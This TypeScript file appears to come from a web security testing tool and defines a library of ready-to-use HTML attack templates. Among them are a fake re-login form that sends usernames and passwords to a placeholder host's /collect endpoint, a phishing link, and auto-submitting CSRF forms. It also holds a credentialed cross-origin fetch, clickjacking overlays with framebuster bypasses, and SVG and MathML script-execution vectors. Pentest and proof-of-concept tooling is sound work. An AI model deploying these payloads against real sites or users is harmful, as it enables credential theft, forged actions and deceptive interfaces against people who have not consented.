import { TemplateCategory } from '../../types/template';

export const htmlCategory: TemplateCategory = {
  id: 'html',
  label: 'HTML',
  description: 'HTML injection, CSRF PoCs, clickjacking overlays, SVG vectors, and form skeletons',
  iconName: 'FileCode',
  subcategories: [
    {
      id: 'html-injection',
      label: 'HTML Injection & Defacement',
      description: 'Proof of concept markup structures for demonstrating client-side HTML context injection',
      templates: [
        {
          id: 'html-inj-heading',
          name: 'Simple Heading Marker (<h1>Test</h1>)',
          description: 'Basic HTML heading tag to prove markup interpretation',
          content: '<h1>Security Audit In Progress</h1>'
        },
        {
          id: 'html-inj-anchor-link',
          name: 'Hyperlink Phishing Anchor',
          description: 'Custom link tag pointing to external security testing target',
          content: '<a href="https://{host}">Click here to verify your account</a>'
        },
        {
          id: 'html-inj-fake-login',
          name: 'Phishing Form Overlay',
          description: 'Fake login credential harvesting form skeleton',
          content: '<div style="background:#fff;padding:20px;border:1px solid #ccc;">\n  <h3>Session Expired - Re-enter Credentials</h3>\n  <form action="http://{host}/collect" method="POST">\n    <input type="text" name="user" placeholder="Username" /><br/>\n    <input type="password" name="pass" placeholder="Password" /><br/>\n    <button type="submit">Login</button>\n  </form>\n</div>'
        },
        {
          id: 'html-inj-meta-refresh',
          name: 'Meta Tag Auto-Redirect',
          description: 'HTML meta refresh tag that forces automatic browser redirection',
          content: '<meta http-equiv="refresh" content="0; url=http://{host}/">'
        },
        {
          id: 'html-inj-css-override',
          name: 'CSS Style Injection',
          description: 'Overwrites page presentation or backgrounds via embedded style tag',
          content: '<style>body { background-color: #ff0000 !important; color: #ffffff !important; }</style>'
        },
        {
          id: 'html-inj-base-hijack',
          name: 'Base Tag URL Hijack',
          description: 'Forces all relative links and script requests to resolve against attacker origin',
          content: '<base href="http://{host}/">'
        }
      ]
    },
    {
      id: 'csrf-pocs',
      label: 'CSRF PoC Generators',
      description: 'Cross-Site Request Forgery exploit templates for POST, GET, and multipart forms',
      templates: [
        {
          id: 'csrf-auto-post',
          name: 'Auto-Submitting POST Form',
          description: 'Standard self-submitting HTML form triggered on page load',
          content: '<html>\n  <body onload="document.forms[0].submit()">\n    <form method="POST" action="{target_url}">\n      <input type="hidden" name="{param_name}" value="{param_value}" />\n    </form>\n  </body>\n</html>'
        },
        {
          id: 'csrf-multipart-form',
          name: 'Multipart/form-data POST Form',
          description: 'Auto-submitting form configured for file upload and multipart endpoints',
          content: '<html>\n  <body onload="document.forms[0].submit()">\n    <form method="POST" action="{target_url}" enctype="multipart/form-data">\n      <input type="hidden" name="{param_name}" value="{param_value}" />\n    </form>\n  </body>\n</html>'
        },
        {
          id: 'csrf-get-img',
          name: 'GET Request CSRF (Image Beacon)',
          description: 'Triggers GET state-change action automatically via img src attribute',
          content: '<img src="{target_url}?{param_name}={param_value}" width="0" height="0" />'
        },
        {
          id: 'csrf-fetch-cors',
          name: 'Fetch with Credentials (CORS PoC)',
          description: 'Sends authenticated cross-origin fetch request with cookies included',
          content: '<script>\n  fetch("{target_url}", {\n    method: "POST",\n    credentials: "include",\n    headers: { "Content-Type": "application/x-www-form-urlencoded" },\n    body: "{param_name}={param_value}"\n  });\n</script>'
        }
      ]
    },
    {
      id: 'clickjacking-pocs',
      label: 'Clickjacking (UI Redress)',
      description: 'Proof of concept iframe overlays for demonstrating clickjacking vulnerabilities',
      templates: [
        {
          id: 'clickjack-transparent-overlay',
          name: 'Transparent Iframe Overlay',
          description: 'Layers a transparent iframe over a deceptive decoy button',
          content: '<style>\n  .decoy-btn {\n    position: absolute;\n    top: 100px;\n    left: 100px;\n    z-index: 1;\n    padding: 10px 20px;\n  }\n  .target-frame {\n    position: absolute;\n    top: 0;\n    left: 0;\n    width: 800px;\n    height: 600px;\n    opacity: 0.3;\n    z-index: 2;\n  }\n</style>\n<button class="decoy-btn">Click Here for Free Access!</button>\n<iframe class="target-frame" src="{target_url}"></iframe>'
        },
        {
          id: 'clickjack-sandboxed-frame',
          name: 'Sandboxed Framebuster Bypass',
          description: 'Neutralizes basic top.location navigation framebusters via sandbox restriction',
          content: '<iframe src="{target_url}" sandbox="allow-forms allow-scripts" width="100%" height="600"></iframe>'
        },
        {
          id: 'clickjack-204-buster',
          name: 'HTTP 204 Framebuster Canceller',
          description: 'Neutralizes framebusters by catching navigation and forcing a 204 No Content loop',
          content: '<script>\n  var prevent_bust = 0;\n  window.onbeforeunload = function() { prevent_bust++; };\n  setInterval(function() {\n    if (prevent_bust > 0) {\n      prevent_bust -= 2;\n      window.top.location = "http://{attacker_host}/204";\n    }\n  }, 1);\n</script>\n<iframe src="{target_url}" width="800" height="600"></iframe>'
        }
      ]
    },
    {
      id: 'svg-xml-markup',
      label: 'SVG & XML Markup Vectors',
      description: 'Standalone SVG and MathML vectors used for XSS and file upload vulnerabilities',
      templates: [
        {
          id: 'svg-onload-alert',
          name: 'SVG Onload Event (<svg onload=...>)',
          description: 'Executes JavaScript immediately upon SVG render',
          content: '<svg onload="alert(1)"></svg>'
        },
        {
          id: 'svg-xlink-interactive',
          name: 'SVG XLink Hyperlink Vector',
          description: 'SVG clickable anchor using xlink:href pseudo-protocol',
          content: '<svg><a xlink:href="javascript:alert(1)"><rect width="100" height="100" fill="red"/></a></svg>'
        },
        {
          id: 'svg-animate-script',
          name: 'SVG Animate OnBegin Vector',
          description: 'Uses SMIL animation onbegin handler to execute script',
          content: '<svg><animate onbegin="alert(1)" attributeName="x" dur="1s"></svg>'
        },
        {
          id: 'svg-foreign-object',
          name: 'SVG ForeignObject Container',
          description: 'Embeds XHTML context inside SVG to execute script tags',
          content: '<svg width="100" height="100"><foreignObject width="100%" height="100%"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject></svg>'
        },
        {
          id: 'mathml-maction-link',
          name: 'MathML MAction Vector',
          description: 'Executes pseudo-protocol on MathML action triggers',
          content: '<math><mtext><maction actiontype="statusline" xlink:href="javascript:alert(1)">Click</maction></mtext></math>'
        }
      ]
    },
    {
      id: 'html-forms',
      label: 'Forms & Inputs',
      description: 'Standard HTML input elements and form structure skeletons',
      templates: [
        {
          id: 'html-form-post',
          name: 'HTML POST Form Skeleton',
          description: 'Basic HTML POST form placeholder',
          content: '<form method="POST" action="{target_url}">\n  <input type="text" name="{param_name}" value="{param_value}" />\n  <button type="submit">Submit</button>\n</form>'
        },
        {
          id: 'html-input-hidden',
          name: 'Hidden Input Tag',
          description: 'Standard hidden input element',
          content: '<input type="hidden" name="{param_name}" value="{param_value}" />'
        },
        {
          id: 'html-form-put-spoof',
          name: 'REST Method Spoofing Form (_method=PUT)',
          description: 'Simulates PUT/DELETE methods for frameworks honoring _method hidden input',
          content: '<form method="POST" action="{target_url}">\n  <input type="hidden" name="_method" value="PUT" />\n  <input type="text" name="{param_name}" value="{param_value}" />\n  <button type="submit">Update</button>\n</form>'
        }
      ]
    },
    {
      id: 'html-containers',
      label: 'Containers & Frames',
      description: 'Standard HTML layout tags and iframe containers',
      templates: [
        {
          id: 'html-iframe-skeleton',
          name: 'Iframe Skeleton',
          description: 'Standard iframe element with sandbox attributes',
          content: '<iframe src="{url}" width="600" height="400" sandbox="allow-scripts"></iframe>'
        },
        {
          id: 'html-object-embed',
          name: 'Object Tag Container',
          description: 'Embeds external data resources via HTML <object> tag',
          content: '<object data="{url}" width="600" height="400"></object>'
        }
      ]
    }
  ]
};
